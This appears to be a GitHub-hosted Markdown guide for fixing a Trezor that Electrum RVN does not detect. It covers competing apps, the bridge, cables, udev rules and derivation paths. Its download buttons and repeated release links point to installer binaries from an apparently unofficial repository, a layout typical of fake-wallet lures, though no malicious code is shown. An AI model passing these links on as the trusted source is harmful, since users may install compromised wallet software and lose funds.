![Electrum RVN](assets/banner-article.png)

# Trezor Not Detected by Electrum RVN

<!-- compact-download-block -->

<p align="center">Bridge, firmware and port, before anything else</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
A Trezor the wallet cannot see is usually another suite holding the device, a charge-only cable, or a connection helper that is not running. The device itself is rarely the problem. Check in that order, and give each step a real attempt before moving on.

## 1. Another suite is holding the device

Trezor Suite and browser-based wallets grab the device on connection. Only one application can talk to it at a time, so the wallet sees nothing while the other one has it.

**Fix:** quit Suite entirely - including any background process or browser tab connected to the device - unplug, replug, and scan again from the wallet.

If the device works in Suite and not here, this is almost certainly the cause.

## 2. The device is locked or on the wrong screen

The Trezor must be unlocked with its PIN, entered on the device. A locked device does not answer.

**Fix:** unlock it, leave it on the main screen, and let the wallet connect.

## 3. The connection helper

Some setups need a bridge or helper process for the browser or the wallet to reach the device over USB. If it is not installed, not running, or out of date, the wallet sees nothing while the cable is fine.

**Fix:** install or update the helper through the vendor, make sure it is running, then scan again. This is a software-layer failure, and it looks identical to a hardware one.

## 4. The cable or the port

Charge-only cables carry no data. Hubs and docks add another failure point.

**Fix:** use the cable that came with the device, plugged directly into the machine. Try a second port, then a second cable.

## 5. Permissions on Linux

Linux needs udev rules for the device, and without them the system sees it while the wallet does not.

**Fix:** install the vendor's rules, reload them, replug the device.

## 6. A version mismatch

A wallet build older than your device firmware can fail to recognise it.

**Fix:** update the wallet from the releases page - https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.

## The derivation path trap

There is a failure that looks like "not detected" but is not: the device connects, the wallet opens a wallet, and the balance is zero. That is the derivation path, not detection - the wallet is reading a different branch of addresses than the one that was funded.

**Fix:** switch the path in the wallet and look again - [zero balance after restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md) explains why a correct seed can show nothing, and it applies to device-backed wallets too.

## Narrowing it down

Ask one question: does the operating system see the device?

- **The system sees it, the wallet does not** - another application, the connection helper, permissions, or a version mismatch.
- **The system does not see it** - cable, port or device.

That split saves the most time. A device that never appears at the system level is not going to be fixed by reinstalling the wallet.

## What not to do

**Do not reinstall repeatedly.** It does not free a device held by another process.

**Do not enter the recovery phrase into software** to work around a connection problem. That is how a setup problem becomes a loss - [importing a hardware wallet seed into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md).

**Do not disable system security** to force detection.

**Do not assume the device is dead** before testing it with the vendor's software on a second machine.

## If the device really has failed

If the vendor's own software cannot see it on a second machine, the device is the problem. The recovery phrase you recorded at setup is the wallet; restore onto a replacement device, or recover into software as a temporary step and move the funds to a fresh seed.

[Using a Trezor with Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md) is the pairing guide, [Ledger not detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/ledger-not-detected-by-electrum-rvn.md) is the equivalent for the other device line, and [wallet file encryption in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/wallet-file-encryption-in-electrum-rvn.md) covers the file that sits beside the device.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [How safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) is the layered picture, and [how to verify an Electrum RVN download](https://github.com/electrum-source/passphrase-backup/blob/main/how-to-verify-an-electrum-rvn-download.md) is the check that makes any of this worth doing. A device that worked yesterday and not today is almost always a software change on the computer - a suite update that now starts at login, a driver update, or a helper that stopped running - so ask what changed before you test the hardware again. [Where Electrum RVN stores your wallet](https://github.com/electrum-source/passphrase-backup/blob/main/where-electrum-rvn-stores-your-wallet.md) is the file question underneath the device question.

## FAQ

### Why is my Trezor not showing in the wallet?

Usually another suite is holding it. Quit Trezor Suite and any browser wallet, then reconnect.

### Do I need the bridge installed?

If your setup uses a connection helper, yes - and it must be running and current. Without it the wallet cannot reach the device.

### My device connects but the balance is zero - why?

The derivation path. The wallet is reading a different branch of addresses; switch it and rescan.

### Is the device broken?

Test it with the vendor's software on another machine first. If it fails there too, the device is the problem and the recovery phrase is the way forward.

### Can I just type my seed into the wallet instead?

You can, and you should not unless you are deliberately migrating. It ends the hardware boundary.

<!-- related-articles -->

## Related articles

- [Zero Balance After Restoring Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/zero-balance-after-restoring-electrum-rvn.md)
- [Import a Hardware Wallet Seed Into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md)
- [Using a Trezor With Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/using-a-trezor-with-electrum-rvn.md)
- [Ledger Not Detected by Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/ledger-not-detected-by-electrum-rvn.md)
